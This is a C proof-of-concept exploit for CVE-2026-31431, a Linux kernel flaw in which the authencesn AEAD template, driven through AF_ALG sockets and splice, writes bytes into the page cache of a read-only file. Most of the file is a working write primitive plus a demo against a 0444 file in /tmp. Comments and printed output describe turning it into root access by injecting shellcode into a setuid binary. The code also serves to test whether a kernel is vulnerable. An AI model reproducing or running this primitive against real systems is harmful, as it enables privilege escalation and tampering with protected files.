/*
 * copyfail – CVE-2026-31431 page-cache write without write permission
 *
 * Root cause: the authencesn AEAD template writes a 4-byte ESN (Extended
 * Sequence Number) past the end of its output scatter-list.  When the output
 * is backed by pages from a read-only file's page cache (via splice), those
 * 4 bytes are written to the page cache without requiring write permission.
 *
 * Attack surface: AF_ALG socket family, AEAD mode.
 * Required config: see pocs/copyfail/kernel.config
 *
 * Exploitation path (not implemented here):
 *   Repeat page_cache_write() across the full length of a setuid binary's
 *   page cache to inject shellcode, then execve() the binary to gain root.
 *
 * Usage: make poc POC=pocs/copyfail/poc.c
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <pwd.h>
#include <sys/utsname.h>
#include <unistd.h>

#define info(fmt, ...) fprintf(stdout, "[*] " fmt "\n", ##__VA_ARGS__)
#define ok(fmt, ...)   fprintf(stdout, "[+] " fmt "\n", ##__VA_ARGS__)
#define err(fmt, ...)  fprintf(stderr, "[-] " fmt "\n", ##__VA_ARGS__)
#define die(fmt, ...)  do { err(fmt, ##__VA_ARGS__); exit(EXIT_FAILURE); } while (0)

/* ── AF_ALG / SOL_ALG constants ──────────────────────────────────────────── */
#ifndef AF_ALG
# define AF_ALG 38
#endif
#ifndef SOL_ALG
# define SOL_ALG 279
#endif
#define ALG_SET_KEY          1
#define ALG_SET_AEAD_AUTHSIZE 4

struct sockaddr_alg {
    uint16_t salg_family;
    uint8_t  salg_type[14];
    uint32_t salg_feat;
    uint32_t salg_mask;
    uint8_t  salg_name[64];
};

/* authencesn(hmac(sha256),cbc(aes)) combined key:
 *   rtattr header (8 bytes) + 16-byte HMAC key + 16-byte AES key */
static const uint8_t AEAD_KEY[40] = {
    0x08, 0x00, 0x01, 0x00,   /* rtattr: len=8, type=1 (RTA_UNSPEC) */
    0x00, 0x00, 0x00, 0x10,   /* enckeylen = 16 (big-endian)         */
    /* 32 zero bytes: 16 HMAC key + 16 AES key */
};

#define AEAD_AUTHSIZE  4   /* ESN field size (the 4 bytes written out-of-bounds) */
#define AEAD_ASSOCLEN  8   /* associated-data length */

/* ── Control message helper ──────────────────────────────────────────────── */
#define CTRL_SZ  (CMSG_SPACE(sizeof(uint32_t)) * 3)

static void build_cmsg(char *buf, size_t bufsz, uint32_t op, uint32_t ivlen,
                       uint32_t assoclen)
{
    memset(buf, 0, bufsz);
    struct cmsghdr *cm = (struct cmsghdr *)buf;

    /* ALG_SET_OP */
    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = 2; /* ALG_SET_OP */
    *(uint32_t *)CMSG_DATA(cm) = op;
    cm = (struct cmsghdr *)((char *)cm + CMSG_SPACE(sizeof(uint32_t)));

    /* ALG_SET_IV (length=0, value ignored for this attack) */
    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = 3; /* ALG_SET_IV */
    *(uint32_t *)CMSG_DATA(cm) = ivlen;
    cm = (struct cmsghdr *)((char *)cm + CMSG_SPACE(sizeof(uint32_t)));

    /* ALG_SET_AEAD_ASSOCLEN */
    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = ALG_SET_AEAD_AUTHSIZE; /* reuse slot, type=4 */
    *(uint32_t *)CMSG_DATA(cm) = assoclen;
}

/* ── Core write primitive ────────────────────────────────────────────────── */
/*
 * Writes 4 bytes (data[4]) at page-cache offset `off` in the file opened
 * as `target_fd` (O_RDONLY) without requiring write permission.
 *
 * The trick:
 *   1. Open an AF_ALG AEAD socket, configure authencesn(hmac(sha256),cbc(aes))
 *   2. sendmsg(MSG_MORE): dummy AAD + plaintext "auth tag" (our payload)
 *   3. splice: pipe (off + AEAD_AUTHSIZE) bytes from the target file's
 *      page cache into the AEAD request buffer
 *   4. recv: triggers in-kernel AEAD decryption; authencesn writes the ESN
 *      (our 4-byte payload) at offset (off) in the page-cache pages
 *   → EBADMSG is expected (auth-tag mismatch); the write already happened
 */
static int page_cache_write(int target_fd, size_t off, const uint8_t data[4])
{
    /* 1. Create AEAD socket */
    int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (alg_fd < 0) { err("socket(AF_ALG): %s", strerror(errno)); return -1; }

    struct sockaddr_alg sa = { .salg_family = AF_ALG };
    memcpy(sa.salg_type, "aead", 5);
    memcpy(sa.salg_name, "authencesn(hmac(sha256),cbc(aes))", 34);

    if (bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        err("bind(AF_ALG): %s – is CONFIG_CRYPTO_USER_API_AEAD=y?", strerror(errno));
        close(alg_fd); return -1;
    }
    if (setsockopt(alg_fd, SOL_ALG, ALG_SET_KEY, AEAD_KEY, sizeof(AEAD_KEY)) < 0) {
        err("setkey: %s", strerror(errno)); close(alg_fd); return -1;
    }
    if (setsockopt(alg_fd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, AEAD_AUTHSIZE) < 0) {
        err("setauthsize(%d): %s", AEAD_AUTHSIZE, strerror(errno)); close(alg_fd); return -1;
    }

    int req_fd = accept(alg_fd, NULL, NULL);
    if (req_fd < 0) {
        err("accept(AF_ALG): %s", strerror(errno)); close(alg_fd); return -1;
    }

    /* 5-second timeout: recv() must not hang if the kernel stalls */
    struct timeval tv = { .tv_sec = 5, .tv_usec = 0 };
    setsockopt(req_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    /* 2. sendmsg: AAD (8 zero bytes) + payload as "ciphertext" (4 bytes = ESN) */
    uint8_t iov_buf[AEAD_ASSOCLEN + AEAD_AUTHSIZE];
    memset(iov_buf, 0, AEAD_ASSOCLEN);
    memcpy(iov_buf + AEAD_ASSOCLEN, data, AEAD_AUTHSIZE);

    struct iovec iov = { iov_buf, sizeof(iov_buf) };
    char ctrl_buf[CTRL_SZ];
    build_cmsg(ctrl_buf, CTRL_SZ, 0 /* ALG_OP_DECRYPT */, 0, AEAD_ASSOCLEN);

    struct msghdr msg = {
        .msg_iov        = &iov,
        .msg_iovlen     = 1,
        .msg_control    = ctrl_buf,
        .msg_controllen = CTRL_SZ,
    };
    if (sendmsg(req_fd, &msg, MSG_MORE) < 0) {
        err("sendmsg: %s", strerror(errno));
        close(req_fd); close(alg_fd); return -1;
    }

    /* 3. splice: target file → pipe → AEAD req */
    int pfd[2];
    if (pipe(pfd) < 0) { close(req_fd); close(alg_fd); return -1; }

    size_t splice_len = off + AEAD_AUTHSIZE;
    loff_t src_off = 0;
    ssize_t s1 = splice(target_fd, &src_off, pfd[1], NULL, splice_len, 0);
    if (s1 < 0) {
        err("splice(file→pipe): %s  splice_len=%zu", strerror(errno), splice_len);
        close(pfd[0]); close(pfd[1]); close(req_fd); close(alg_fd); return -1;
    }
    ssize_t s2 = splice(pfd[0], NULL, req_fd, NULL, (size_t)s1, 0);
    if (s2 < 0) {
        err("splice(pipe→alg): %s", strerror(errno));
        close(pfd[0]); close(pfd[1]); close(req_fd); close(alg_fd); return -1;
    }
    info("    splice: %zd → %zd bytes sent to AEAD", s1, s2);

    /* 4. recv: triggers decryption; authencesn ESN write fires here */
    uint8_t rbuf[AEAD_ASSOCLEN + 256];
    ssize_t n = recv(req_fd, rbuf, sizeof(rbuf), 0);
    if (n < 0) {
        if (errno == EAGAIN || errno == EWOULDBLOCK)
            err("recv timed out (5 s) – kernel stalled; check algorithm availability");
        else if (errno != EBADMSG)
            err("recv: %s (errno=%d)", strerror(errno), errno);
        /* EBADMSG = auth-tag mismatch, expected; the ESN write may have already fired */
    }
    info("    recv: n=%zd  errno=%d (%s)", n, errno, strerror(errno));

    close(pfd[0]); close(pfd[1]);
    close(req_fd); close(alg_fd);
    return 0;
}

/* ── Demonstration ───────────────────────────────────────────────────────── */
static void exploit(void)
{
    struct utsname u;
    uname(&u);
    info("Kernel : %s %s %s", u.sysname, u.release, u.machine);
    info("PoC    : copyfail – CVE-2026-31431 page-cache write w/o write perm");

    /* Create a read-only target file, fill it with 'A' */
    const char *path = "/tmp/copyfail_target";
    uint8_t original[256];
    memset(original, 'A', sizeof(original));

    int wfd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (wfd < 0) die("open(O_WRONLY): %s", strerror(errno));
    if (write(wfd, original, sizeof(original)) != (ssize_t)sizeof(original))
        die("write: %s", strerror(errno));
    close(wfd);
    chmod(path, 0444);   /* read-only for everyone */

    int rfd = open(path, O_RDONLY);
    if (rfd < 0) die("open(O_RDONLY): %s", strerror(errno));

    info("Target : %s  (mode 0444, opened O_RDONLY)", path);
    info("Before : first 8 bytes = \"%.8s\"", original);

    /* Write "XXXX" at offset 0 via authencesn ESN overwrite */
    const uint8_t payload[4] = { 'X', 'X', 'X', 'X' };
    info("Writing \"XXXX\" at offset 0 via authencesn ESN out-of-bounds write ...");
    if (page_cache_write(rfd, 0, payload) < 0) {
        err("page_cache_write failed – check kernel config");
        close(rfd);
        return;
    }
    close(rfd);

    /* Read back and verify */
    uint8_t buf[256] = {0};
    int vfd = open(path, O_RDONLY);
    if (vfd < 0) die("open(verify): %s", strerror(errno));
    read(vfd, buf, sizeof(buf));
    close(vfd);

    info("After  : first 8 bytes = \"%.8s\"", buf);

    if (memcmp(buf, "XXXX", 4) == 0) {
        ok("Page-cache write SUCCEEDED without write permission!");
        ok("Kernel is VULNERABLE to copyfail (CVE-2026-31431).");
        info("---");
        info("Full escalation path: overwrite a setuid binary's page-cache");
        info("with shellcode, then execve() it to gain root.");
    } else {
        err("Page cache unchanged – kernel may be patched or AF_ALG AEAD unavailable.");
        err("Check that CONFIG_CRYPTO_USER_API_AEAD=y and CONFIG_CRYPTO_AUTHENC=y.");
    }
}

int main(void)
{
    uid_t uid = getuid();
    struct passwd *pw = getpwuid(uid);
    info("copyfail  pid=%d  user=%s  uid=%d",
         getpid(), pw ? pw->pw_name : "?", uid);

    exploit();

    uid_t uid_after = getuid();
    if (uid_after == 0)
        ok("uid: %d → 0  (root!)", uid);
    else
        info("uid after: %d (no escalation in this demo)", uid_after);

    return 0;
}
